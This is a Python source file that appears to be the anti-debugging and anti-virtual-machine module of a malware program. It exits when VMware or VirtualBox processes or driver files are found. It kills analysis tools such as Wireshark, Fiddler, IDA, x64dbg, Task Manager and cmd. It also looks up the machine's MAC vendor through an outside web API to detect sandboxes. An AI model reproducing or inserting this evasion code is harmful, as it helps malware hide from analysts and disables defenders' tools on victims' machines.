import requests
import psutil
import uuid
import sys
import os
import time

class Antidbg:
    def proc_check():
        processes = ["VMwareService.exe", "VMwareTray.exe"]
        for proc in psutil.process_iter():
            for program in processes:
                if proc.name() == program:
                    sys.exit()

    def dll_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")

        if os.path.exists(vmware_dll):
            sys.exit()
        if os.path.exists(virtualbox_dll):
            sys.exit()

    def process_check():
        PROCESSES = [
            "http toolkit.exe",
            "httpdebuggerui.exe",
            "wireshark.exe",
            "fiddler.exe",
            "charles.exe",
            "regedit.exe",
            "cmd.exe",
            "taskmgr.exe",
            "vboxservice.exe",
            "df5serv.exe",
            "processhacker.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "ida64.exe",
            "ollydbg.exe",
            "pestudio.exe",
            "vmwareuser",
            "vgauthservice.exe",
            "vmacthlp.exe",
            "x96dbg.exe",
            "vmsrvc.exe",
            "x32dbg.exe",
            "vmusrvc.exe",
            "prl_cc.exe",
            "prl_tools.exe",
            "qemu-ga.exe",
            "joeboxcontrol.exe",
            "ksdumperclient.exe",
            "ksdumper.exe",
            "joeboxserver.exe",
            "xenservice.exe",
        ]
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in PROCESSES):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        

class Antivm:
    mac_vm=["Oracle", "Pcs Systemtechnik GmbH","VMWare","Microsoft","Parallels","VM","Virtual Machine","Super Micro Computer"]

    def get_mac():
        mac = (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
        for ele in range(0,8*6,8)][::-1]))
        return mac


    def info(macaddr:str):
        r=requests.get(f"https://api.macvendors.com/{macaddr}")
        if r.status_code == 200:
            return True, r.text
        else:
            return False, "Invalid"

    def run():
        mac = Antivm.get_mac()
        vm = False
        success, vendor = Antivm.info(mac)
        for x in Antivm.mac_vm:
            key = x.replace(","," ")
            key = key.split()
            
            if x == vendor:
                vm=True
            
            if x.lower() == vendor.lower():
                vm = True
                
            for y in key:
                
                vendor_s=vendor.replace(","," ")
                vendor_s=vendor_s.replace("."," ")
                vendor_s=vendor_s.split()

                for z in vendor_s:
                    if y == z:
                        vm = True
                    if y.lower() == z.lower():
                        vm = True
        return vm